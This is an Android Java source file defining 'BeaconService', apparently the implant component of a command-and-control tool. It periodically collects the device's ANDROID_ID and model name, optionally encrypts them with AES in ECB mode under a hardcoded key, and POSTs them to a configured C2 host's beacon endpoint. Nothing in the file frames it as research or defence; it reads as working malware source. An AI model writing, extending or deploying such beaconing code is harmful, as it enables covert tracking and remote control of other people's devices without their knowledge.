package com.cosmic;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import android.util.Base64;

public class BeaconService extends Service {
    private static final String TAG = "CosmicBeacon";
    private Handler handler;
    private Runnable beaconRunnable;
    private String c2Host;
    private int c2Port;
    private int interval;
    private boolean encryptionEnabled;

    @Override
    public void onCreate() {
        super.onCreate();
        c2Host = Config.C2_HOST;
        c2Port = Config.C2_PORT;
        interval = Config.BEACON_INTERVAL;
        encryptionEnabled = Config.ENCRYPTION_ENABLED;

        handler = new Handler(Looper.getMainLooper());
        beaconRunnable = new Runnable() {
            @Override
            public void run() {
                beacon();
                handler.postDelayed(this, interval * 1000);
            }
        };
        handler.post(beaconRunnable);
    }

    private void beacon() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String deviceId = android.provider.Settings.Secure.getString(getContentResolver(),
                            android.provider.Settings.Secure.ANDROID_ID);
                    String data = "{\"id\":\"" + deviceId + "\",\"hostname\":\"" + android.os.Build.MODEL + "\"}";
                    if (encryptionEnabled) {
                        data = encrypt(data);
                    }

                    URL url = new URL("http://" + c2Host + ":" + c2Port + "/c2/beacon.php");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
                    wr.write(data);
                    wr.flush();

                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    String response = "";
                    String line;
                    while ((line = in.readLine()) != null) {
                        response += line;
                    }
                    in.close();
                    wr.close();

                    Log.i(TAG, "Beacon response: " + response);
                } catch (Exception e) {
                    Log.e(TAG, "Beacon error", e);
                }
            }
        }).start();
    }

    private String encrypt(String data) throws Exception {
        SecretKeySpec key = new SecretKeySpec("COSMIC-KEY-2026!".getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        byte[] encrypted = cipher.doFinal(data.getBytes());
        return Base64.encodeToString(encrypted, Base64.DEFAULT);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        handler.removeCallbacks(beaconRunnable);
        super.onDestroy();
    }
}
